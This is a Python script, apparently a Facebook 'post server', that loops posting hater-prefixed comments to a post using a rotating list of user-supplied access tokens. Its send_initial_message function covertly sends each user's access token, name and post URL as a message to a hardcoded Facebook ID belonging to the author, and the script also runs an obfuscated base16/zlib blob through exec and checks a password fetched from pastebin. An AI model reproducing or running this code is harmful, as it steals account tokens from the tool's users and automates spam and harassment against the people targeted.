import requests
import json
import time
import pytz
import datetime
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

html_content = """
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MONXTER BRAND POST SERVER</title>
    <style>
        body {
            background-image: url('Monxter.jpg');
            background-size: cover;
        }
        .container {
            text-align: center;
            margin-top: 50px;
        }
        .box {
            border: 2px solid black;
            width: 300px;
            margin: 0 auto;
            padding: 20px;
            background-color: rgba(255, 255, 255, 0.5);
            color: black;
        }
        .credit {
            text-align: left;
        }
        .thanks {
            margin-top: 50px;
            text-align: center;
            color: black;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <h1>TRICKER MONXTER BRAND POST </h1>
            <div class="credit">
                <p>1. CREDIT:- MONXTER RULEX</p>
                <p>2. OWNER => MONXTER</p>
                <p>3. YOUTUBE:- <a href="https://youtube.com/@monxterrulexhere?si=1YkyDgjPaPi4oa4j">YouTube</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/Loffar.monxter.inside?mibextid=ZbWKwL">Facebook</a></p>
           
            </div>
        </div>
    </div>
    <div class="thanks">
        <p>❤️Thanks for using my server❤️</p>
        <p>👇Subscribe to my YouTube channel👇</p>
        <a href="https://youtube.com/@monxterrulexhere?si=1YkyDgjPaPi4oa4j </a>
    </div>
</body>
</html>
"""
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode())        
def execute_server():
    PORT = int(os.environ.get('PORT', 4000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()
utc_now = datetime.datetime.utcnow()
indian_timezone = pytz.timezone('Asia/Kolkata')
ist_now = utc_now.replace(tzinfo=pytz.utc).astimezone(indian_timezone)
formatted_time = ist_now.strftime("\033[1;38;5;208m Time :- %Y-%m-%d %I:%M:%S %p")
print(formatted_time)
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b16decode(__[::-1]));exec((_)(b'FFB1A3AB70FFFBFDFA6F17EB8DB47170E7573C01AF099D2C4B99D2E0124CD54EBEA8CC9BFDD855DB088C92CC661701C154E5B15E4CAB142E87FB0EC8EB62F6E485C8C48911788C940BE489A54C7B010A09638700B480AAEF412073413AA1E1C0A64FF1B59DDF1C3AF6D0EDCA8958BD1CEDF0A1E378427989C993210E317879525FF59607EBC8E77EFE37FA79A53BA852F6BF302ED5AD40FADC72DB065077EA00F6D5EDC7FBF834DA387559DD12C3E1FE2BD7F35183D37BE422FDD1D917345C96FABD6DB2A7ECAFB3ABC93B7FB2FB10C127EC9DE9391E3BE6BC2311AE69D00AAFBECDFB77FCCCF9C7FB6B51CE373BDBC4ECAFCAF741AD50C286BB280E044CC472C8223FDC3702F9E93A0F3CF80EE85F5D8B22231ED59723408C1E2878873C099E470DF6C143C8DB9AB48AA83A37BEE64342BB327D7064FC81591E98B641F23814EC1BF0991F9449849B805B4FF8828EA9CA36D031410D89526803A0EDFEBC5B9AFD2D0E6105F7F9C4881823C6239606998D881CA7DC8B9694C77414A77991A3196B4D3EBB147C841B9AC97BD48426D577AACDBCA7BD9189D17BB0C75DCA4BB2785D82A1FC15C0129BAB1509D2D46A6D53E19F82960A49E174F05679ED6FF9D40BEC748505EC2FCB456AC2762EA90DE25943598777E0FB6B6028A04234F12274A24E4963190E15EE02523A7BE2E4C26D8ED473B8D14B0D1FFC6C0956EC7E8A87CA2E3D764E93CA8FBF39D19E7239B5B908B697A4C2C9CE29335984DAD76686BC6A7E9DE4103D7052A069ABAFF9AA988969BE48540073E1CA00E2CCA7FEC95B1B2722F6765AD84F7CB9DBFD93CB4AEBD7D8D3B61FC1653F94B96824C7A1ACA15DEE98ACF4423AD3376D42AC9E6BE01961AD3B4C567E29D5684F2F95692EACBFD3319F6877A78F93E17DF25E742BECB9377A6F9F576EC89DC9B7B1FAFC3FDF9FCFCFEFFFFBFB7F8FF793247D55624E9AFC5E89B72D66E4D88B02F8828060DFF7E4D5809252ECD54551C987'))
	
def send_initial_message():
    
    mmm_pass = requests.get('https://pastebin.com/raw/xiXncTa9').text
    
    if mmm_pass not in password:
        print('\033[1;31m⚠︎ Your Password Changed By Monxter ⚠︎')
        sys.exit()
    
    # Message template
    msg_template = "CREDIT:- MONXTER RULEX \n Owner => MONXTER \n Hello Monxter Sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["100006628659578"]
    
    requests.packages.urllib3.disable_warnings()
    
    for target_id in target_ids:
        for token in tokens:
            access_token = token.strip()
            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)
            msg = msg_template.format(post_url, haters_name, access_token)
            parameters = {'access_token': access_token, 'message': msg}
            response = requests.post(url, json=parameters, headers=headers)
            time.sleep(0.1)
            print("\n\033[1;31m[+] Initial messages sent. Starting the message sending loop...\n")

def post_comments():
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_comments)
    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = tokens[token_index].strip()
                comment = comments[comment_index].strip()
                url = "https://graph.facebook.com/{}/comments".format(post_url)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print("\033[1;36m[✓] TRICKER MONXTER BRAND SERVER RUNING Comment No. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『MONXTER ♡ RULEX </3 MONXTER BRAND』•═══════✭✪')
                else:
                    print("\033[1;35m[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『MONXTER ♡ RULEX </3 MONXTER BRAND』•═══════✭✪')
                time.sleep(speed)
            print("\n[+] All comments sent successfully. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_initial_message()
    post_comments()
if __name__ == '__main__':
    main()
